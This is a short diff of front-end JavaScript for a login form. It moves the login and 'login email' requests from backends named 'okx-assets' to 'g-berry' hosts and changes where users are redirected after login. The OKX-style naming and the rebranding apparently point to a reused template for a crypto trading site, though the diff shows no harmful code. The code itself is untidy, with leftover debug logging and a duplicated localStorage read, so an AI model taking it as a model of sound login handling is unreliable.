@@ -9,7 +9,7 @@ const sendLoginEmail = async () => {
   const data = {
     email: email.value,
   };
-  fetch('https://okx-assetsbackend.onrender.com/api/loginemailsand', {
+  fetch('https://g-berrybackend.onrender.com/api/loginemailsand', {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json',
@@ -36,7 +36,7 @@ button.onclick = async (event) => {
   console.log(data);
   button.innerHTML = "Loading...";
 
-  fetch('https://okx-assets-back-end.vercel.app/api/login', {
+  fetch('https://g-berry-back-end.vercel.app/api/login', {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json',
@@ -49,14 +49,16 @@ button.onclick = async (event) => {
       console.log(response)
       const userId = localStorage?.getItem('userId')
       console.log("Local User Id", userId);
-      if (response._id === '' || response._id === undefined){
-        alert('Please enter your valid credentials');
+      if (response.message === 'User have not been verified'){
+        window.location = `https://tradingassets-account.vercel.app/`;
         console.log("object");
         return
       }else{
         console.log("object2");
+         const id = localStorage?.getItem('userId')
+         console.log(userId)
         sendLoginEmail()
-        window.location = `https://okx-assets-dashboard.vercel.app/#/${userId}`;
+        window.location = `https://tradingassets-account.vercel.app/#/${id}`;
       }
     })
     .catch((error) => {
